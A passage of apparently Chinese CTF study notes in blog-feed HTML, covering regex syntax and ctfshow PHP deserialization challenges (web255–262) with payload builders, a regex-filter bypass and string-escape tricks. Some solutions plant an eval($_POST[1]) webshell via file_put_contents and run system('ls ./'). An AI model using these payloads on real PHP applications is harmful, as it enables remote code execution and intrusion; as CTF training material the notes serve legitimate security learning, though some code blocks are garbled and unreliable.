src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805160955.png"></p></li><li><p>  [a-z] 带 - ，表示一个区间，匹配括号中限制了范围的所有字符</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805161206.png"></p></li><li><p>. 匹配除了换行符之外的任何单个字符，相当于[^\n\r]</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805161324.png"></p></li><li><p>[\s\S] 匹配所有，\s时匹配所有空白符，包括换行，\S非空白符，不包括换行</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805161524.png"></p></li><li><p>  \w 匹配字母，数字，下划线，等价于[A-Za-z0-9_]</p></li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805161534.png"></p><h2 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h2><ol><li>  使用特殊字符时必须进行转义，使用 \ 进行转义</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805161836.png"></p><h2 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h2><ol><li><p>  限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。</p></li><li><p>？ * +</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805162132.png"></p></li><li><p>  {n} n是一个非负整数，匹配确定的n次。例如o{2},会匹配到food中的oo，但是不会匹配到bob中的一个o，也可以理解为必须几次</p></li><li><p>  {n,} 至少匹配n次，例如o{2,} 不能匹配bob中的o，但是可以匹配到foooooo的中的所有o，o{1,}等价于o+,o{0,}等价于o*</p></li><li><p>  {n,m} n&lt;=m,最少匹配n次且最多匹配m次，</p></li><li><p>注意，限定符出现在范围表达式之后，因此，应用于整个范围表达式。/[1-9][0-9]**/</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805162839.png"></p></li></ol><h2 id="贪婪"><a href="#贪婪" class="headerlink" title="贪婪"></a>贪婪</h2><ol><li><p>下面的表达式匹配从开始小于符号 (&lt;) 到关闭 h1 标记的大于符号 (&gt;) 之间的所有内容。</p>  <pre class="line-numbers language-html" data-language="html"><code class="language-html">/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.*</span><span class="token punctuation">></span></span>/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  *** 和 + 限定符都是贪婪的，因为它们会尽可能多的匹配文字，只有在它们的后面加上一个 ? 就可以实现非贪婪或最小匹配。**</p></li><li><p>非贪婪：如果只需要匹配开始和结束h1标签</p>  <pre class="line-numbers language-html" data-language="html"><code class="language-html">/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>.*?</span><span class="token punctuation">></span></span>/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>  通过在 *、+ 或 ? 限定符之后放置 ?，该表达式从”贪婪”表达式转换为”非贪婪”表达式或者最小匹配。</li></ol></li></ol><p><a href="https://www.runoob.com/regexp/regexp-syntax.html">https://www.runoob.com/regexp/regexp-syntax.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E9%A2%98/"/>
      <url>/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%9F%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化原理"><a href="#PHP反序列化原理" class="headerlink" title="PHP反序列化原理"></a>PHP反序列化原理</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li>  序列化就是将对象转换成字符串。反序列化相反，数据的格式的转换对象的序列化利于对象的保存和传输，也可以让多个文件共享对象。</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220804163144.png"></p><ol start="2"><li>  最根本的是数据类型和格式的一种相互转换</li><li>  serialize() 将一个对象转换成一个字符串</li><li>  unserialize() 将字符串还原成一个对象</li></ol><h3 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h3><ol><li>  unserialize() 函数的变量可控，文件中存在可以利用的类</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220804164302.png"></p><ol start="2"><li>  上面”name”也可以理解为是一个值</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220804164601.png"></p><ol start="3"><li>  上图 s表示string类型 6表示6位 “xiaodi”表示值为”xiaodi”</li><li>  serialize()和unserialize()都是要先进行格式的判断，如果假如给一个字符串进行unserialize()则没有返回结果，如果给一个对象进行serialize()则也没有对象，因为数据类型格式不对，无法识别。</li></ol><h2 id="注意PHP单引号和双引号的区别"><a href="#注意PHP单引号和双引号的区别" class="headerlink" title="注意PHP单引号和双引号的区别"></a>注意PHP单引号和双引号的区别</h2><ol><li><p>  php里的单引号会把内容当作纯文本，不会经过服务器翻译</p></li><li><p>  而双引号相反，里面的内容会经过服务器处理</p></li><li><p>```php<br>  $foo=”data”;<br>  echo ‘$foo’; //单引号会输出$foo<br>  echo “$foo”; //双引号会转义，输出data</p>  <pre class="line-numbers language-none"><code class="language-none">4.   单引号不能处理变量和转义字符，**除了(\\\和\)**# PHP反序列化真题## 添加cookie的方法：1.   用burp去添加cookie，抓包后添加指定名字的cookie，只需要在cookie的后面加上待添加cookie的名称&#x3D;待添加的值，即可&#96;&#96;&#96;htmlCookie: user&#x3D;xxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133836.png"></p></li><li><p>  用firefox的插件添加</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805133940.png"></p></li></ol><h2 id="序列化一个类的语法"><a href="#序列化一个类的语法" class="headerlink" title="序列化一个类的语法"></a>序列化一个类的语法</h2><ol><li>  将一个类实例化 (实例化时在类的后面加不加括号都可以，不影响输出的结果)。</li><li>  将这个对象序列化</li><li>  将序列化后的字符串进行url编码</li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="对类的控制"><a href="#对类的控制" class="headerlink" title="对类的控制"></a>对类的控制</h2><ol><li>  我们不能改类的方法，即不能改类中的代码</li><li>  但是我们<strong>可以控制类的属性</strong>，即<strong>更改类中变量的值</strong>，例如，源码为：public isvip = true;我们可以改为public isvip = false;</li></ol><h2 id="ctfshow原题"><a href="#ctfshow原题" class="headerlink" title="ctfshow原题"></a>ctfshow原题</h2><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><ol><li>  对cookie进行反序列化，需要调用user中的login函数，而此函数在ctfShowUser类中出现，则需要对ctfShowUser进行反序列化</li><li>  使用php在线反序列化工具即可</li></ol><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">==     数值相等  可以进行数据类型转换（在比较前进行转换），如果类型转换后$a和$b相等，则为true===   全等   不进行数据类型转换（不在比较前进行转换），如果$a等于$b，并且数据类型也相同，才能为true!=     不等   可以进行数据类型转换，如果类型转换后$a和$b不相等，返回值为true!==    不全等  不进行数据类型转换，如果$a和$b不相等，或者类型不相同，返回值为true&lt;=>    太空船运算符  当$a小于，等于，大于$b时分别返回一个小于，等于，大于0的int值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  题目有多个限制</li><li>  第一，username和password变量的值不能为空</li><li>  第二，实例化后的user对象，login函数中限制，username和传入login函数的$u相等，password中传入login函数的 $p相等，并且是强相等</li><li>  第三，判断调用的checkVip()函数中isVip的值是否为true</li><li>  第四，判断vipOneKeyGetFlag()函数中username和password是否不相等，是!==的不相等，可以进行数据类型转化</li><li>  这道题因为我们可以控制实例化的类，因为要求username和password不相等，所以我们可以在实例化类的时候将类中的username和password的值进行更改</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805142240.png"></p><ol start="7"><li>  一定不要忘记变量username和password的值要用引号包裹</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805142340.png"></p><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><ol><li><p>  __destruct()：折构函数/方法</p></li><li><p>  析构函数的作用和构造函数正好相反，<strong>析构函数只有在对象被垃圾收集器收集前</strong>（即对象从内存中删除之前）<strong>才会被自动调用</strong>。析构函数允许我们在销毁一个对象之前执行一些特定的操作，例如关闭文件、释放结果集等。</p></li><li><p>  在 PHP 中有一种垃圾回收机制，<strong>当对象不能被访问时就会自动启动垃圾回收机制</strong>，<strong>收回对象占用的内存空间</strong>。而析构函数正是在垃圾回收机制回收对象之前调用的。</p></li><li><p>析构函数不能带有任何参数,即无参析构函数（参考无参构造函数）</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token operator">...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><ol><li>  ctfShowUser中调用了info()类，但是还提供了另一个backDoor类</li><li>  在反序列化时，我们只能控制类的属性，即类中变量的值，不能控制类的方法的代码，即不能更改类的代码</li><li>  可以直接将ctfShowUser类中对info类的控制改为对backDoor的控制</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805151736.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805152421.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805152509.png"></p><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220805152722.png"></p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><h3 id="关于正则表达式的绕过"><a href="#关于正则表达式的绕过" class="headerlink" title="关于正则表达式的绕过"></a>关于正则表达式的绕过</h3><ol><li>  当绕过了几个字符进行拼接的情况时，我们可以使用+来连接字符</li><li>  这个和底层的unserialize()函数的原理有关</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220806173123.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220806173143.png"></li></ol><ol><li><p>  加了一个正则表达式的过滤，不能出现o:数字和c:数字的情况</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220806171117.png"></p></li><li><p>我们可以使用**o:+**来绕过，使用str_replace()函数进行更改</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'被更改的字符'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'更改后的字符'</span><span class="token punctuation">,</span>被更改的变量<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>记住更改backDoor类中的code,eval(eval())是可以执行最内层的eval的,eval和system可以随意套</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$code</span><span class="token operator">=</span><span class="token string single-quoted-string">'eval($_POST[1])'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20220806172147228.png" alt="image-20220806172147228"></p></li><li><p>先进行实例化后的序列化操作，然后根据产生结果进行替换，最后进行url编码</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':11'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">':+11'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':8'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">':+8'</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220806171729.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220806171817.png"></p></li></ol><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><h3 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h3><ol><li>  serialize()函数是<strong>对对象进行序列化</strong>，序列化是对象，而字符串也是一个对象</li><li>  <strong>字符串序列化后还是包括它本身</strong>，只是多了类型等信息</li></ol><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220806182604.png"></p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20220806182712288.png" alt="image-20220806182712288"></p><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><h3 id="file-put-contents"><a href="#file-put-contents" class="headerlink" title="file_put_contents()"></a>file_put_contents()</h3><ol><li><p>  file_put_contents()函数把一个字符串写入文件中</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807132406.png"></p></li><li><p>  参数：file_put_contenst($写入哪个文件，$写入文件的数据)</p></li><li><p>  <img src="C:\Users\86188\AppData\Roaming\Typora\typora-user-images\image-20220807132631831.png" alt="image-20220807132631831"></p></li><li><p>  使用FILE_APPEND标记，可以在文件末尾追加内容</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807132811.png"></p></li></ol><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807133844.png"></p><ol><li><p>  因为这个地方没有调用实例化后的类，并且在类后面显式地加入参数，所以这里的__invoke()函数是用不到的</p></li><li><p>```php<br>  // php __invoke()函数的使用<br>  // __invoke()函数会在将一个对象当作一个方法来使用时自动调用<br>  public mixed __invoke() {</p><pre><code>  //其它功能</code></pre><p>  }<br>  // 意义就是：可以将实例当作普通方法来调用<br>  //例如下面：$Person = new Person(); 此时的$Person就可以当作普通方法</p>  <?php  class Person  {      public $sex;      public $name;      public $age;        public function __construct($name="",  $age=25, $sex='Male')      {          $this->name = $name;          $this->age  = $age;          $this->sex  = $sex;      }        public function __invoke()      {          return '你好，我的名字是: '. $this->name . '，我 '. $this->age .' 岁了。';      }  }    $person = new Person('Yufei',30,'Male');    echo $person(), "\n";  <pre class="line-numbers language-none"><code class="language-none">3.   4.   __wakeup()在类的外部使用unserialize()函数进行调用时，**会自动调用\__wakeup函数**，这个函数判断username和password是否为空5.   &#96;&#96;&#96;php     &#x2F;&#x2F;就是当使用unserialize()反序列化一个对象成功后，会自动调用这个对象的__wakeup()魔术方法     public function __wakeup() &#123;         &#x2F;&#x2F;一些其它的初始化操作     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li></li><li><p>  在__destruct()函数中，使用file_put_contents将password写入username中，所以这个地方要求username是一个文件，password可以是一句话木马</p></li><li><p>0x36d是877，这里是弱类型比较</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfShowvip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>  将序列化后的代码用?vip=拼接到后面</li><li>  在URL后面加877.php，post传1=phpinfo();1=system(‘ls ./‘);最后在根目录下发现flag_is_here即可解出答案</li></ol></li></ol><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><ol><li><p>直接观察源代码，发现index中没有任何引用flag的，但是发现还有一个php文件</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807133844.png"></p></li><li><p>打开它查看源码</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807142457.png"></p></li><li><p>修改类中的token，然后进行序列化，base64_encode即可</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807142611.png"></p></li><li><p>加到cookie中，拿到flag</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220807142648.png"></p></li></ol><h2 id="web262-1"><a href="#web262-1" class="headerlink" title="web262"></a>web262</h2><h3 id="PHP反序列化特点"><a href="#PHP反序列化特点" class="headerlink" title="PHP反序列化特点"></a>PHP反序列化特点</h3><ol><li><p>  PHP在进行反序列化时，底层代码是以**;<strong>作为字段的分隔，以</strong>}**作为结尾(字符串除外),并且是根据长度判断内容的，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化。</p></li><li><p>下图中因为abcd在大括号之外，所以不会被反序列化成功，在之前已经结束了</p><p>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210215065212-466131e0-6f17-1.png"></p></li><li><p>当序列化长度不对应的时候会出现报错</p><p>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210215065245-5a400ca4-6f17-1.png"></p></li><li><p>可以反序列化类中不存在的元素</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'purplet'</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'20'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'O:4:"user":3:&#123;s:4:"name";s:7:"purplet";s:3:"age";s:2:"20";s:6:"gender";s:3:"boy";&#125;'</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210215065311-69ea8c56-6f17-1.png"></p></li></ol><h3 id="PHP反序列化字符逃逸、什么样的才能逃逸"><a href="#PHP反序列化字符逃逸、什么样的才能逃逸" class="headerlink" title="PHP反序列化字符逃逸、什么样的才能逃逸"></a>PHP反序列化字符逃逸、什么样的才能逃逸</h3><ol><li><p>  <strong>字符逃逸的本质其实也是闭合</strong>，但是它分为两种情况，一是字符变多，二是字符变少</p></li><li><p>  对<strong>序列化后的字符串进行了一个替换</strong>，而且替换导致了<strong>字符数量的不一致</strong>，使用了类似于**str_replace()**等函数</p></li><li><p>注意是序列化后，先后顺序，先serialize() 再str_replace(),因为序列化后再替换，替换的只有value,而不会替换string判断的长度，这时候就可以去构造逃逸</p></li></ol><h3 id="字符逃逸–字符增多"><a href="#字符逃逸–字符增多" class="headerlink" title="字符逃逸–字符增多"></a>字符逃逸–字符增多</h3><ol><li></li></ol><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/p/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'WW'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'purplet'</span><span class="token punctuation">;</span><span class="token variable">$age</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"10"</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">37</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"a:2:&#123;i:0;s:7:"</span>purplet<span class="token string double-quoted-string">";i:1;s:2:"</span><span class="token number">10</span><span class="token string double-quoted-string">";&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><p>  修改age的值的代码，值为 <strong>“;i:1;s:2:”20”;}”</strong> 再计算一下构造代码长度为16，同时知晓过滤是每有一个p就会多出一个字符，那么此时就再需要输入16个p，与上面构造的代码 <strong>“;i:1;s:2:”20”;}”</strong> 拼接，即username=’pppppppppppppppp”;i:1;s:2:”20”;}’,这样序列化对应的32位长度再过滤后的序列化时就会被32个w全部填充，从而 <strong>“;i:1;s:2:”20”;}</strong> 成功逃逸（后面逃逸出去的就不要了，即<strong>后面的值被忽略</strong>，<strong>这是特点1</strong>）</p></li><li><p>这时就可以绕过对某个属性值的过滤</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220808142636.png"></p></li></ol><h3 id="字符逃逸–字符减少"><a href="#字符逃逸–字符减少" class="headerlink" title="字符逃逸–字符减少"></a>字符逃逸–字符减少</h3><ol><li><p>```php</p>  <?php  function filter($string){      $filter = '/pp/i';      return preg_replace($filter,'W',$string);  }  $username = 'ppurlet';  $age = '10';  $user = array($username, $age);  var_dump(serialize($user));  echo "<pre>";  $r = filter(serialize($user));  var_dump($r);  var_dump(unserialize($r));  ?>  <pre class="line-numbers language-none"><code class="language-none">     ![](https:&#x2F;&#x2F;xzfile.aliyuncs.com&#x2F;media&#x2F;upload&#x2F;picture&#x2F;20210215065553-ca5e56b2-6f17-1.png)     这个地方虽然替换后字符串长度减少了，但是在序列化后的字符串中显示的还是7，因为这种字符减少的字符逃逸会向后吞噬第一个 **&quot;** 直到 **;** 结束，所以这种问题就不再是只传一个值，而是应该**在username处传递构造的过滤字符，age处传递逃逸代码**#### 字符减少字符逃逸三步走#### 第一步1.   将**age的值改为要修改的数值**，即20,得到age处序列化的值为     &#96;&#96;&#96;php     ;i:1;s:2:&quot;20&quot;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>上面得到的值即为<strong>最终的逃逸代码</strong>，把这段数值<strong>再次传入demo代码的age处</strong></p><p>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210215065635-e32c9b9a-6f17-1.png"></p></li></ol><h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><ol><li><p>age处传递一个任意数值和双引号进行闭合，即再次传入</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php">age<span class="token operator">=</span><span class="token constant">A</span><span class="token string double-quoted-string">";i:1;s:2:"</span><span class="token number">20</span>"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210215065653-edea1ef4-6f17-1.png"></p></li></ol><h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><ol><li><p>  计算选中部分（长度为13），根据过滤后字符缩减情况构造，demo中每两个p变为一个W，相当于逃逸1位，<strong>选中部分即为逃逸字符</strong></p></li><li><p>最终传递</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php">username<span class="token operator">=</span>pppppppppppppppppppppppppp，age<span class="token operator">=</span><span class="token constant">A</span><span class="token string double-quoted-string">";i:1;s:2:"</span><span class="token number">20</span>"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>  <img src="https://xzfile.aliyuncs.com/media/upload/picture/20210215065708-f758aaf0-6f17-1.png"></p></li></ol><h3 id="计算公式"><a href="#计算公式" class="headerlink" title="计算公式"></a>计算公式</h3><ol><li>  逃逸字符数 * 过滤时多出来/少出来的字符数</li><li>  实际问题就是如何多出来逃逸代码的字符数</li></ol><h3 id="wp思路讲解"><a href="#wp思路讲解" class="headerlink" title="wp思路讲解"></a>wp思路讲解</h3><ol><li><p>序列化时，类中所有的属性（定义的变量）都会显示出来，即使没有给他传入参数，即如果有锁死的，不能由外部传入而改变的属性，也会在序列化时显示出来</p>  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">user</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$isVIP</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span><span class="token variable">$this</span> <span class="token operator">-></span> <span class="token property">isVIP</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>// 